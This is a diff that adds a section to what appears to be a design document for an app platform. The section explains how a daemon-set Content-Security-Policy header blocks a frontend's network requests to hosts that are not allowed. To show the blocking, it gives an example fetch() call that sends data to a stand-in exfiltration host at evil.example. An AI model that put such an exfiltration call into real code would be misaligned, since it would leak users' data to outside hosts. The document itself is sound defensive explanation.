@@ -431,6 +431,28 @@ data to arbitrary third-party hosts. An app frontend without CSP can
 request, not the backend. Every data-reading cap (kv, db, fs) leaks
 immediately unless the frontend is also restricted.
 
+**How CSP actually blocks `fetch()`.** CSP is enforced by the browser's
+networking layer, not by the page's JS. When a page calls
+`fetch("https://evil.example/exfil")`:
+
+1. The browser consults the CSP that arrived with the page (as HTTP header).
+2. If `connect-src` does not whitelist `evil.example`, the browser refuses
+   to initiate the request. No socket opens, no DNS resolves, no packet sent.
+3. The `fetch()` Promise rejects with a network error; a CSP violation is
+   logged to console (and reported to `report-uri` if configured to a
+   daemon-controlled endpoint).
+
+The page cannot disable, patch, or monkey-path this check — the enforcement
+is in the browser binary, below the JS runtime. `fetch`, `XMLHttpRequest`,
+`new Image()`, `<link>`, `<script>`, `new WebSocket()`, `new EventSource()`,
+`navigator.sendBeacon` are all subject to the same gate. The trust root is
+the operator's browser: if it honors CSP correctly (all current major
+browsers do, strictly), the frontend has no path to a non-whitelisted host.
+
+The app also cannot widen CSP from its own code. A `<meta http-equiv="Content-Security-Policy">`
+tag the app emits can only intersect with the header, not relax it. The
+daemon's header is the ceiling.
+
 **The daemon sets CSP; the app cannot widen it.** Every HTTP response the
 daemon serves on an app's behalf carries a `Content-Security-Policy` header
 derived from the manifest. The app's backend handler returns body + app-level
